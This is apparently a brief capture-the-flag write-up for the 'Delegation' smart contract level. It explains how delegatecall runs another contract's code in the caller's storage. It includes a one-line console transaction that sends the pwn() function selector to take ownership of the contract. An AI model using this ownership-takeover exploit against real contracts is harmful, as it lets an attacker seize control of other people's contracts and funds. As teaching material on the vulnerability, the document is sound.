# 06-Delegation

1. `delegatecall` is low level function call that execute target contract logic using current contract context. By providing `msg.data` with first 4 bytes of keccak hash of "pwn()", the function selector. We can call the function, modifying `owner` using `Delegate` contract logic, but with `Delegation` context, thus the `owner` of `Delegation` modified.

```shell
// "0xdd365b8b" is the first 4 bytes of keccak256 hash of "pwn()"
contract.sendTransaction({data:"0xdd365b8b"})
```
